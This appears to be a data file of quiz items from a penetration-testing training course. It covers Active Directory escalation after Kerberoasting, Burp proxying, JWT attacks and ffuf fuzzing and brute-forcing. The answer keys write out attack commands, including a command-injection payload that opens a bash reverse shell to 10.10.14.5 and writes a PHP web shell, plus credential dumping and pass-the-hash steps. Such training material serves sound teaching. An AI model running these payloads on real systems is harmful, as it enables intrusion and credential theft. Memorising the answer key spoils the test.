{"module_id":12,"type":"fill_command","difficulty":"medium","prompt":"Using PowerView, write the command to find all domain user accounts with the 'Description' field populated (potential password storage):","options":None,"answer":"Get-DomainUser -Properties samaccountname,description | Where-Object {$_.description -ne $null} | Select-Object samaccountname,description","explanation":"Admins frequently store passwords in AD user Description fields. This command filters for non-null descriptions and displays username + description.","validation_regex":"Get-DomainUser.*description|samaccountname.*description","hints":["Filter where description is not null","Use Select-Object for clean output"]},
{"module_id":12,"type":"case_file","difficulty":"hard","prompt":"After Kerberoasting, you crack the hash for svc_sql:Winter2024!. Describe the next 4 steps to escalate to Domain Admin.","options":None,"answer":"Step 1 — Validate credential: nxc smb 10.10.10.5 -u svc_sql -p 'Winter2024!' — look for [+] and (Pwn3d!) for local admin.\nStep 2 — BloodHound analysis: right-click svc_sql → Mark as Owned → run 'Shortest Paths from Owned Principals to Domain Admins'.\nStep 3 — Check for ACL abuse: if svc_sql has GenericAll/WriteDACL on any DA-path object, exploit it (force password reset, add to Domain Admins group).\nStep 4 — If svc_sql has local admin on a server where a DA is logged in: dump credentials with secretsdump or Mimikatz to get DA's NTLM hash → PTH to DC.","explanation":"Every cracked service account must be immediately validated and analysed in BloodHound. The path from a Kerberoasted account to DA almost always exists — BloodHound finds it automatically.","validation_regex":"(?i)bloodhound|nxc|secretsdump|Pwn3d|ACL|WriteDACL|local admin","hints":["Mark as owned in BloodHound first","Look for ACL-based paths to DA"]},

# Module 13 – Web Proxies
{"module_id":13,"type":"fill_command","difficulty":"easy","prompt":"Write the curl command to send a GET request to http://target.com/api/users through Burp Suite proxy (127.0.0.1:8080), ignoring SSL errors:","options":None,"answer":"curl -x http://127.0.0.1:8080 -k http://target.com/api/users","explanation":"-x specifies the proxy. -k ignores SSL errors (Burp uses its own CA). This routes curl through Burp for interception, logging, and modification.","validation_regex":"curl.*-x.*127\\.0\\.0\\.1:8080.*-k|curl.*-k.*-x.*8080","hints":["-x sets the proxy address","-k ignores SSL cert errors"]},
{"module_id":13,"type":"multiple_choice","difficulty":"medium","prompt":"In Burp Intruder, which attack type tests ALL combinations of a username list (50 entries) and a password list (100 entries)?","options":["Sniper","Battering Ram","Pitchfork","Cluster Bomb"],"answer":"Cluster Bomb","explanation":"Cluster Bomb tests every combination: 50 usernames x 100 passwords = 5000 total requests. Pitchfork would only test 50 pairs in parallel. Cluster Bomb is correct for credential brute-force.","validation_regex":None,"hints":["Which attack type generates ALL combinations?","50 x 100 = how many requests?"]},
{"module_id":13,"type":"fill_command","difficulty":"medium","prompt":"Write the curl command to send a JSON POST request to http://target.com/api/login with body {\"username\":\"admin\",\"password\":\"test\"} through Burp proxy:","options":None,"answer":"curl -x http://127.0.0.1:8080 -k -X POST http://target.com/api/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'","explanation":"JSON APIs require Content-Type: application/json header. -d sends request body. -X POST specifies the method. Without Content-Type, many APIs reject the request.","validation_regex":"curl.*Content-Type.*application/json.*-d.*username|curl.*-X POST.*application/json","hints":["-H sets headers","-d is the request body"]},
{"module_id":13,"type":"decision_tree","difficulty":"medium","prompt":"You find a JWT token in the Authorization header. What is the correct attack sequence?","options":["Ignore it — JWTs are secure","Decode in Burp Decoder → check algorithm → try alg:none attack → if HS256, brute-force weak secret → check claims for privilege escalation","Brute-force the entire token","Change the token value to 'admin' and forward"],"answer":"Decode in Burp Decoder → check algorithm → try alg:none attack → if HS256, brute-force weak secret → check claims for privilege escalation","explanation":"JWT attacks: (1) alg:none removes signature verification. (2) Weak HS256 secrets can be cracked with jwt_tool or hashcat. (3) Claim modification — change role:user to role:admin if signature validation is broken. Use Burp JWT Editor extension.","validation_regex":"(?i)alg.*none|HS256|jwt|Decode","hints":["Always decode the JWT payload first","What happens if you set alg to none?"]},
{"module_id":13,"type":"case_file","difficulty":"hard","prompt":"You find GET /api/v1/export?format=pdf — the response takes 3 seconds. When you change format=pdf to format=pdf; sleep 5, the response takes 8 seconds. What vulnerability is present and what are your next steps?","options":None,"answer":"This is blind OS command injection. The 'format' parameter is passed to an OS command (e.g., convert report.html output.pdf) without sanitisation. The 5-second additional delay confirms execution.\nNext steps: (1) Confirm OOB: format=pdf; ping -c 3 10.10.14.5 — run tcpdump to confirm ICMP. (2) Establish reverse shell: format=pdf%3b bash -i >%26 /dev/tcp/10.10.14.5/4444 0>%261. (3) Alternatively: write shell to web root via format=pdf; echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php.","explanation":"Time-delay confirmation is the gold standard for blind command injection. URL-encoding the redirect operators is necessary for GET parameters.","validation_regex":"(?i)command injection|blind|sleep|reverse shell|ping","hints":["The time difference confirms OS command execution","URL-encode special characters in GET parameters"]},

# Module 14 – Ffuf
{"module_id":14,"type":"fill_command","difficulty":"medium","prompt":"Write the ffuf command to enumerate virtual hosts on IP 10.10.10.5, testing subdomains from subdomains-top1million-5000.txt for domain target.com, filtering the default response size of 1234 bytes:","options":None,"answer":"ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.5 -H 'Host: FUZZ.target.com' -fs 1234","explanation":"Vhost enumeration manipulates the Host header while keeping the IP constant. -fs 1234 filters out the default response size. Determine the size to filter by running without -fs first and noting the baseline response size.","validation_regex":"ffuf.*subdomains.*Host.*FUZZ\\.target\\.com.*-fs|ffuf.*-H.*Host.*FUZZ","hints":["FUZZ goes in the Host header","Filter by the default response size with -fs"]},
{"module_id":14,"type":"fill_command","difficulty":"medium","prompt":"Write the ffuf command to discover hidden GET parameters on http://target.com/search.php using burp-parameter-names.txt, filtering responses of 1024 bytes:","options":None,"answer":"ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://target.com/search.php?FUZZ=value' -fs 1024","explanation":"Parameter fuzzing places FUZZ in the parameter name position. Parameters that cause a different response size than the baseline (filtered with -fs 1024) are potentially valid. Follow up in Burp Repeater.","validation_regex":"ffuf.*burp-parameter-names.*FUZZ=value|ffuf.*search\\.php.*FUZZ","hints":["FUZZ replaces the parameter name","Filter out the baseline response size"]},
{"module_id":14,"type":"multiple_choice","difficulty":"easy","prompt":"What ffuf flag enables recursive directory discovery?","options":["-r","-recursion","-R","-depth"],"answer":"-recursion","explanation":"-recursion makes ffuf automatically fuzz subdirectories of discovered directories. Use with -recursion-depth N to limit depth. This discovers multi-level structures without manually running ffuf for each discovered directory.","validation_regex":None,"hints":["The flag name matches the function","Add -recursion-depth to control depth"]},
{"module_id":14,"type":"fill_command","difficulty":"hard","prompt":"Write the ffuf command to brute-force a login form at http://target.com/login using POST, fuzzing only the password field, with username fixed as 'admin', filtering by 302 redirect (success = redirect), using rockyou.txt:","options":None,"answer":"ffuf -w /usr/share/wordlists/rockyou.txt -u http://target.com/login -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc 302","explanation":"-mc 302 matches only responses with 302 status code (redirect = successful login). Failed logins return 200 (same login page). This is more reliable than -fs when the failure response size varies.","validation_regex":"ffuf.*rockyou.*POST.*username=admin.*password=FUZZ.*-mc 302|ffuf.*-mc 302.*login","hints":["-mc matches specific response codes","Success usually redirects (302), failure returns 200"]},
{"module_id":14,"type":"decision_tree","difficulty":"medium","prompt":"ffuf discovers: /backup/ returns 301, /api/ returns 200, /old-site/ returns 403. Which do you investigate first and why?","options":["/backup/ — 301 always means interesting","All three equally","/api/ then /backup/ — 200 is accessible, 301 may redirect to content, 403 may be bypassable","Only /api/ — ignore 301 and 403"],"answer":"/api/ then /backup/ — 200 is accessible, 301 may redirect to content, 403 may be bypassable","explanation":"/api/ returning 200 is immediately accessible — run ffuf recursively against it. /backup/ returning 301 likely redirects to /backup/ — follow then recurse. /old-site/ returning 403 may be bypassable with X-Forwarded-For: 127.0.0.1 or verb tampering.","validation_regex":None,"hints":["200 = accessible now","301 redirect to where?","403 may be bypassable"]},

